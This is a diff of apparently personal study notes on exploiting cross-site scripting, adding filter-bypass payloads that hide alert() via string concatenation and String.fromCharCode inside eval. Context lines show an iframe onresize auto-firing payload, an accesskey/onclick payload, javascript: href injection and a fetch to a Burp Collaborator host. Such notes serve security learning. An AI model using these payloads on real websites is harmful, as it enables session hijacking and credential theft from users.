@@ -1,8 +1,8 @@
 exploitation 
 
-
-- if the payload is inserted in a href    you can use `javascript:payload`
-- if you found xss try to find failure to invalidate session on logout
+##### if eval() function is not escaped 
+- in a scenario alert() function is escaped so we used `<script>eval("ale"+"rt(1)")</script>`  so the eval() function will skip the validation on the alert() because of the concatenation that we did 
+- we can use the function `String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)` inside the eval function to to make sure that the alert(1) didn't got caught  so the final payload is `<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>`
 - 
 ##### input field auto submit the username and the password in the comment 
 ```java script
@@ -192,4 +192,6 @@ fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
 ##### notes 
 - what if you want to to make the severity of you xss  high and not demand user interaction but only a few tags are allowed like `onresize` so we need auto resize script so if we found that the page allows me to use it in `iframes` so we can use code like that 1. `<iframe src="https://vulnerablePage?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`
 - even if the element isn't visible in the web site it still be vulnerable to XSS for ex  the website takes the URL and put it in `a` tag in the `head` so it's not visible so we can use that payload `https://victim.com?'accesskey='x'onclick='alert(1)` so when the user press ALT +X the payload will execute  '
--  
+-  - if the payload is inserted in a href    you can use `javascript:payload`
+- if you found xss try to find failure to invalidate session on logout
+- 
